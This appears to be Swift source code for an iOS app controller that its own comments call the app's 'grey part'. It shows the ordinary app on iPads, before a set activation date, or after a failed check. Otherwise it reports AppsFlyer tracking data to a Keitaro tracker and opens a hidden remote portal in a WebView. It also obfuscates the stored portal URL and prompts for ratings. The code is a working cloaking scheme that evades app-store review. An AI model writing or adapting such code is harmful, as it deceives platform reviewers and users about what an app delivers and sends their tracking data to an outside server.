import Foundation
import Combine
import UIKit
import StoreKit
import AppsFlyerLib

// MARK: - Memory Flow Controller
// Контроллер потоков для управления серой частью
class MemoryFlowController: ObservableObject {
    static let shared = MemoryFlowController()
    
    @Published var memoryDisplayMode: MemoryDisplayState = .preparing
    @Published var memoryCachedEndpoint: String? = nil
    @Published var memoryIsLoading = true
    
    // Flag to prevent URL updates after fetching new URL
    private var memoryIsRefreshingFromRemote = false
    
    private let memoryRemoteConfigEndpoint = "https://newteam-online.com/Ff9KKwHQ"
    
    // Уникальные ключи для проекта
    private let memoryPersistentStateKey = "memory_persistent_state_v1"
    private let memorySecuredEndpointKey = "memory_secured_endpoint_v1"
    private let memoryExtractedIdentifierKey = "memory_extracted_id_v1"
    private let memoryWebViewShownKey = "memory_webview_shown"
    private let memoryRatingShownKey = "memory_rating_shown"
    private let memoryDateCheckKey = "memory_date_check"
    
    // AppsFlyer UID
    private var memoryAppsFlyerUID: String = ""
    private var memoryAppsFlyerConversionData: [AnyHashable: Any] = [:]
    
    private var memorySavedPathId: String? {
        get { UserDefaults.standard.string(forKey: memoryExtractedIdentifierKey) }
        set { UserDefaults.standard.set(newValue, forKey: memoryExtractedIdentifierKey) }
    }
    
    private var memoryFallbackState: Bool {
        get { UserDefaults.standard.bool(forKey: memoryPersistentStateKey) }
        set { UserDefaults.standard.set(newValue, forKey: memoryPersistentStateKey) }
    }
    
    private var memoryWebViewShown: Bool {
        get { UserDefaults.standard.bool(forKey: memoryWebViewShownKey) }
        set { UserDefaults.standard.set(newValue, forKey: memoryWebViewShownKey) }
    }
    
    private var memoryRatingShown: Bool {
        get { UserDefaults.standard.bool(forKey: memoryRatingShownKey) }
        set { UserDefaults.standard.set(newValue, forKey: memoryRatingShownKey) }
    }
    
    private init() {
        // Initialize published property from secure storage
        self.memoryCachedEndpoint = memorySecureRetrieveEndpoint()
        
        // НЕ получаем UID здесь - ждём ATT и conversion data от AppsFlyer
        // self.memoryAppsFlyerUID будет установлен в memoryUpdateAppsFlyerData()
        
        // Run initialization sequence с задержкой для ATT
        DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
            self.memoryRunInitializationSequence()
        }
    }
    
    // MARK: - Initialization Sequence
    private func memoryRunInitializationSequence() {
        memoryPerformInitialValidations()
    }
    
    private func memoryPerformInitialValidations() {
        // Check 1: Device type
        guard memoryValidateDeviceType() else { return }
        
        // Check 2: Temporal condition
        guard memoryValidateTemporalCondition() else { return }
        
        // Check 3: Persistent state (fallback = white навсегда)
        guard memoryCheckPersistentState() else { return }
        
        // Check 4: Cached endpoint - если есть, показываем WebView сразу
        if let endpoint = memorySecureRetrieveEndpoint(), !endpoint.isEmpty {
            memoryActivatePrimaryMode()
            memoryValidateEndpointInBackground(endpoint)
            return
        }
        
        // Check 5: Если нет cached endpoint - НЕ делаем запрос здесь!
        // Ждём conversion data от AppsFlyer в memoryUpdateAppsFlyerData()
        print("⏳ [MemoryFlowController] No cached endpoint - waiting for AppsFlyer conversion data...")
        
        // Но если AppsFlyer не отвечает долго (10 сек), делаем запрос без данных
        DispatchQueue.main.asyncAfter(deadline: .now() + 10.0) { [weak self] in
            guard let self = self else { return }
            
            // Проверяем что мы всё ещё ждём (не было conversion data)
            if self.memoryDisplayMode == .preparing && !self.memoryFallbackState && !self.memoryWebViewShown {
                print("⚠️ [MemoryFlowController] AppsFlyer timeout - making request without conversion data")
                
                // Получаем UID (к этому моменту ATT точно уже отработал)
                self.memoryAppsFlyerUID = AppsFlyerLib.shared().getAppsFlyerUID()
                print("🔑 [MemoryFlowController] UID after timeout: \(self.memoryAppsFlyerUID), length: \(self.memoryAppsFlyerUID.count)")
                
                self.memoryFetchRemoteConfiguration()
            }
        }
    }
    
    private func memoryValidateDeviceType() -> Bool {
        if UIDevice.current.model == "iPad" {
            memoryActivateSecondaryMode()
            return false
        }
        return true
    }
    
    private func memoryValidateTemporalCondition() -> Bool {
        let memoryFormatter = DateFormatter()
        memoryFormatter.dateFormat = "dd.MM.yyyy"
        // Дата активации: 15.01.2025
        if let memoryThreshold = memoryFormatter.date(from: "15.01.2025"),
           Date() < memoryThreshold {
            memoryActivateSecondaryMode()
            return false
        }
        return true
    }
    
    private func memoryCheckPersistentState() -> Bool {
        if memoryFallbackState {
            memoryActivateSecondaryMode()
            return false
        }
        return true
    }
    
    // MARK: - URL Management with Obfuscation
    private func memorySecureStoreEndpoint(_ newValue: String?) {
        guard let memoryEndpoint = newValue else {
            UserDefaults.standard.removeObject(forKey: memorySecuredEndpointKey)
            print("📝 [MemoryFlowController] Endpoint removed from storage")
            DispatchQueue.main.async { self.memoryCachedEndpoint = nil }
            return
        }
        
        // Обфусцируем перед сохранением
        if let memoryTransformed = MemoryDataProcessor.memoryTransform(memoryEndpoint) {
            UserDefaults.standard.set(memoryTransformed, forKey: memorySecuredEndpointKey)
            print("📝 [MemoryFlowController] Endpoint transformed and stored")
        } else {
            // FALLBACK: сохраняем как есть если обфускация не удалась
            UserDefaults.standard.set(memoryEndpoint, forKey: memorySecuredEndpointKey)
            print("⚠️ [MemoryFlowController] Transform failed, storing plain (fallback)")
        }
        
        DispatchQueue.main.async { self.memoryCachedEndpoint = memoryEndpoint }
    }
    
    private func memorySecureRetrieveEndpoint() -> String? {
        guard let memoryStored = UserDefaults.standard.string(forKey: memorySecuredEndpointKey) else {
            print("📝 [MemoryFlowController] No endpoint found in storage")
            return nil
        }
        
        // Пытаемся деобфусцировать
        if let memoryRestored = MemoryDataProcessor.memoryRestore(memoryStored) {
            print("📝 [MemoryFlowController] Endpoint restored successfully")
            return memoryRestored
        }
        
        // FALLBACK: проверяем не plain URL ли это
        if memoryStored.hasPrefix("http") {
            print("⚠️ [MemoryFlowController] Using plain stored value (fallback)")
            return memoryStored
        }
        
        print("❌ [MemoryFlowController] Failed to retrieve endpoint")
        return nil
    }
    
    // MARK: - AppFlyer Integration
    func memoryUpdateAppsFlyerData(memoryUid: String, memoryConversionData: [AnyHashable: Any] = [:]) {
        self.memoryAppsFlyerUID = memoryUid
        self.memoryAppsFlyerConversionData = memoryConversionData
        
        // Если memoryFallbackState установлен - НЕ делаем запрос (белая часть навсегда)
        if memoryFallbackState {
            print("⚪ [MemoryFlowController] Fallback state is true - skipping AppsFlyer update")
            return
        }
        
        // Если WebView уже был показан - не меняем состояние
        if memoryWebViewShown {
            print("🌐 [MemoryFlowController] WebView already shown - keeping current state")
            return
        }
        
        // Если еще нет сохраненного URL, делаем запрос к Keitaro с новыми данными
        if memoryCachedEndpoint == nil || memoryCachedEndpoint?.isEmpty == true {
            memoryFetchRemoteConfiguration()
        }
    }
    
    // MARK: - Configuration Fetching
    private func memoryFetchRemoteConfiguration() {
        // Формируем URL с параметрами AppFlyer
        let memoryTargetURL = MemoryURLConstructor.memoryBuildURL(
            memoryAppsFlyerUID: memoryAppsFlyerUID,
            memoryConversionData: memoryAppsFlyerConversionData
        )
        
        print("🔗 [MemoryFlowController] Config URL: \(memoryTargetURL)")
        
        guard let memoryURL = URL(string: memoryTargetURL) else {
            print("❌ [MemoryFlowController] Invalid config URL - showing white mode")
            memoryActivateSecondaryMode()
            return
        }
        
        var memoryRequest = URLRequest(url: memoryURL)
        memoryRequest.timeoutInterval = 10.0
        memoryRequest.httpMethod = "GET"
        
        print("📡 [MemoryFlowController] Making request...")
        
        URLSession.shared.dataTask(with: memoryRequest) { [weak self] memoryData, memoryResponse, memoryError in
            DispatchQueue.main.async {
                guard let self = self else { return }
                
                // Check for network errors
                if let memoryError = memoryError {
                    print("❌ [MemoryFlowController] Network error: \(memoryError.localizedDescription)")
                    self.memoryActivateSecondaryMode()
                    return
                }
                
                // Check HTTP response
                if let memoryHttpResponse = memoryResponse as? HTTPURLResponse {
                    print("📊 [MemoryFlowController] HTTP Status: \(memoryHttpResponse.statusCode)")
                    print("🔗 [MemoryFlowController] Response URL: \(memoryHttpResponse.url?.absoluteString ?? "nil")")
                    
                    if memoryHttpResponse.statusCode > 403 {
                        print("❌ [MemoryFlowController] HTTP error \(memoryHttpResponse.statusCode) - showing white mode")
                        self.memoryActivateSecondaryMode()
                        return
                    }
                    
                    // Get final URL after redirects
                    if let memoryFinalURL = memoryHttpResponse.url?.absoluteString {
                        print("🎯 [MemoryFlowController] Final URL after redirects: \(memoryFinalURL)")
                        
                        if memoryFinalURL != memoryTargetURL {
                            print("✅ [MemoryFlowController] URL changed after redirect - saving and showing WebView")
                            
                            // Extract and save pathid parameter
                            self.memoryExtractAndSavePathId(from: memoryFinalURL)
                            
                            // Set flag to prevent URL updates from WebView
                            self.memoryIsRefreshingFromRemote = true
                            
                            // Save the final redirected URL
                            self.memorySecureStoreEndpoint(memoryFinalURL)
                            self.memoryActivatePrimaryMode()
                            
                            // Reset flag after a delay
                            DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
                                self.memoryIsRefreshingFromRemote = false
                            }
                            return
                        }
                    }
                }
                
                print("❌ [MemoryFlowController] Unexpected response - showing white mode")
                self.memoryActivateSecondaryMode()
            }
        }.resume()
    }
    
    // MARK: - URL Validation
    private func memoryValidateEndpointInBackground(_ memoryUrl: String) {
        print("🔍 [MemoryFlowController] Validating saved URL in background: \(memoryUrl)")
        
        guard let memoryValidationURL = URL(string: memoryUrl) else {
            print("❌ [MemoryFlowController] Invalid saved URL format - fetching new with pathid")
            memoryFetchConfigurationWithPathId()
            return
        }
        
        var memoryValidationRequest = URLRequest(url: memoryValidationURL)
        memoryValidationRequest.timeoutInterval = 10.0
        memoryValidationRequest.httpMethod = "HEAD"
        
        URLSession.shared.dataTask(with: memoryValidationRequest) { [weak self] _, memoryValidationResponse, memoryValidationError in
            guard let self = self else { return }
            
            if let memoryValidationError = memoryValidationError {
                print("❌ [MemoryFlowController] Validation network error: \(memoryValidationError.localizedDescription)")
                self.memoryFetchConfigurationWithPathId()
                return
            }
            
            if let memoryValidationHttpResponse = memoryValidationResponse as? HTTPURLResponse {
                print("📊 [MemoryFlowController] Validation HTTP Status: \(memoryValidationHttpResponse.statusCode)")
                
                if memoryValidationHttpResponse.statusCode >= 200 && memoryValidationHttpResponse.statusCode <= 403 {
                    print("✅ [MemoryFlowController] Saved URL is valid (status \(memoryValidationHttpResponse.statusCode))")
                    return
                } else if memoryValidationHttpResponse.statusCode > 403 {
                    print("❌ [MemoryFlowController] Saved URL is dead (status \(memoryValidationHttpResponse.statusCode)) - fetching new with pathid")
                    self.memoryFetchConfigurationWithPathId()
                    return
                }
            }
            
            print("❌ [MemoryFlowController] Unexpected validation response - fetching new with pathid")
            self.memoryFetchConfigurationWithPathId()
        }.resume()
    }
    
    // MARK: - Configuration with PathId
    private func memoryFetchConfigurationWithPathId() {
        guard let memoryPathId = memorySavedPathId, !memoryPathId.isEmpty else {
            print("❌ [MemoryFlowController] No saved pathId - showing empty WebView")
            memoryActivatePrimaryMode()
            return
        }
        
        let memoryUrlWithPathId = "\(memoryRemoteConfigEndpoint)?pathid=\(memoryPathId)"
        print("🔗 [MemoryFlowController] Config URL with pathId: \(memoryUrlWithPathId)")
        
        guard let memoryPathIdURL = URL(string: memoryUrlWithPathId) else {
            print("❌ [MemoryFlowController] Invalid config URL with pathId - showing empty WebView")
            memoryActivatePrimaryMode()
            return
        }
        
        var memoryPathIdRequest = URLRequest(url: memoryPathIdURL)
        memoryPathIdRequest.timeoutInterval = 10.0
        memoryPathIdRequest.httpMethod = "GET"
        
        print("📡 [MemoryFlowController] Making request to Keitaro with pathId...")
        
        URLSession.shared.dataTask(with: memoryPathIdRequest) { [weak self] memoryPathIdData, memoryPathIdResponse, memoryPathIdError in
            DispatchQueue.main.async {
                guard let self = self else { return }
                
                if let memoryPathIdError = memoryPathIdError {
                    print("❌ [MemoryFlowController] Network error with pathId: \(memoryPathIdError.localizedDescription)")
                    self.memoryActivatePrimaryMode()
                    return
                }
                
                if let memoryPathIdHttpResponse = memoryPathIdResponse as? HTTPURLResponse {
                    print("📊 [MemoryFlowController] HTTP Status with pathId: \(memoryPathIdHttpResponse.statusCode)")
                    
                    if memoryPathIdHttpResponse.statusCode > 403 {
                        print("❌ [MemoryFlowController] HTTP error \(memoryPathIdHttpResponse.statusCode) with pathId - showing empty WebView")
                        self.memoryActivatePrimaryMode()
                        return
                    }
                    
                    if let memoryPathIdFinalURL = memoryPathIdHttpResponse.url?.absoluteString {
                        print("🎯 [MemoryFlowController] Final URL after redirects with pathId: \(memoryPathIdFinalURL)")
                        
                        if memoryPathIdFinalURL != memoryUrlWithPathId {
                            print("✅ [MemoryFlowController] URL changed after redirect with pathId - saving and showing WebView")
                            
                            self.memoryIsRefreshingFromRemote = true
                            self.memorySecureStoreEndpoint(memoryPathIdFinalURL)
                            self.memoryActivatePrimaryMode()
                            
                            DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
                                self.memoryIsRefreshingFromRemote = false
                            }
                            return
                        }
                    }
                }
                
                print("❌ [MemoryFlowController] Unexpected response with pathId - showing empty WebView")
                self.memoryActivatePrimaryMode()
            }
        }.resume()
    }
    
    // MARK: - PathId Extraction
    private func memoryExtractAndSavePathId(from memoryUrl: String) {
        guard let memoryUrlComponents = URLComponents(string: memoryUrl),
              let memoryQueryItems = memoryUrlComponents.queryItems else {
            print("⚠️ [MemoryFlowController] Could not parse URL components from: \(memoryUrl)")
            return
        }
        
        for memoryQueryItem in memoryQueryItems {
            if memoryQueryItem.name.lowercased() == "pathid", let memoryPathIdValue = memoryQueryItem.value {
                print("🔑 [MemoryFlowController] Found pathId: \(memoryPathIdValue)")
                memorySavedPathId = memoryPathIdValue
                return
            }
        }
        
        print("⚠️ [MemoryFlowController] No pathId parameter found in URL: \(memoryUrl)")
    }
    
    // MARK: - Flow States
    private func memoryActivateSecondaryMode() {
        print("⚪ [MemoryFlowController] Setting WHITE mode - showing original app")
        DispatchQueue.main.async {
            self.memoryDisplayMode = .original
            self.memoryFallbackState = true
            self.memoryIsLoading = false
        }
    }
    
    private func memoryActivatePrimaryMode() {
        print("🌐 [MemoryFlowController] Setting WEBVIEW mode - showing portal")
        DispatchQueue.main.async {
            self.memoryDisplayMode = .webContent
            self.memoryIsLoading = false
            
            // Показываем алерт оценки если нужно
            if self.memoryWebViewShown && !self.memoryRatingShown {
                DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
                    self.memoryShowSystemRatingAlert()
                }
            }
            
            self.memoryWebViewShown = true
        }
    }
    
    // MARK: - URL Management
    func memoryGetCurrentURL() -> String? {
        return memorySecureRetrieveEndpoint()
    }
    
    func memoryUpdateURL(_ memoryNewURL: String) {
        print("🔄 [MemoryFlowController] URL update attempt: \(memoryNewURL)")
        
        // Block updates if we're currently updating from remote
        if memoryIsRefreshingFromRemote {
            print("🚫 [MemoryFlowController] Blocking URL update - currently updating from remote")
            return
        }
        
        // Only save if it's different from config URL, not the tracking domain, and not already saved
        if memoryNewURL != memoryRemoteConfigEndpoint && !memoryNewURL.contains("newteam-online.com") && memoryNewURL != memoryGetCurrentURL() {
            print("💾 [MemoryFlowController] Saving new URL: \(memoryNewURL)")
            memorySecureStoreEndpoint(memoryNewURL)
        } else {
            print("⏭️ [MemoryFlowController] Skipping URL save (tracking domain, same as config, or already saved)")
        }
    }
    
    // MARK: - Rating Alert
    private func memoryShowSystemRatingAlert() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) {
            if let memoryWindowScene = UIApplication.shared.connectedScenes.first as? UIWindowScene {
                SKStoreReviewController.requestReview(in: memoryWindowScene)
                self.memoryRatingShown = true
            }
        }
    }
    
    // MARK: - Display State
    enum MemoryDisplayState {
        case preparing
        case original
        case webContent
    }
}
